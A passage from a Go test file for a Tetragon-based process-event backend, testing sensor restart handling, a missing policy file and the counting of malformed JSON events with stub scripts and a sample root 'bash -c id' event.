	if err := os.WriteFile(tetragonPath, []byte(tetragonScript), 0o755); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	tetraScript := "#!/bin/sh\nsleep 0.2\nprintf '%s\\n' '" + raw + "'\n"
	if err := os.WriteFile(tetraPath, []byte(tetraScript), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithOptions(policyPath, "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath}, ProcessRestartPolicy{
		Enabled:     true,
		MaxRestarts: 3,
		Delay:       10 * time.Millisecond,
	})
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	for range events {
	}
	waitForBackendHealth(t, backend, func(health contract.Health) bool {
		return health.RestartCount >= 4 && strings.Contains(health.LastExitReason, "exit status 7")
	})
	data, err := os.ReadFile(countPath)
	if err != nil {
		t.Fatalf("ReadFile(count) error = %v", err)
	}
	if string(data) != "3" {
		t.Fatalf("managed sensor restart count file = %q, want 3", string(data))
	}
}

func TestBackendRequiresPolicy(t *testing.T) {
	backend := NewBackend(filepath.Join(t.TempDir(), "missing.yaml"), "-", "test")
	if _, err := backend.Subscribe(context.Background(), contract.CollectionIntent{}); err == nil {
		t.Fatal("Subscribe() error = nil")
	}
}

func TestBackendRecordsParseErrors(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	eventPath := filepath.Join(dir, "events.jsonl")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(eventPath, []byte("{bad-json}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	select {
	case _, ok := <-events:
		if ok {
			t.Fatal("unexpected event")
		}
	case <-time.After(time.Second):
		t.Fatal("timed out waiting for closed events")
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.ParseErrors != 1 {
		t.Fatalf("ParseErrors = %d", health.ParseErrors)
	}
}

func waitForBackendHealth(t *testing.T, backend *Backend, done func(contract.Health) bool) {
	t.Helper()
	deadline := time.Now().Add(time.Second)
	var last contract.Health
	for time.Now().Before(deadline) {
		health, err := backend.Health(context.Background())
		if err != nil {
			t.Fatalf("Health() error = %v", err)
		}
		last = health
		if done(health) {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for backend health, last = %+v", last)
}
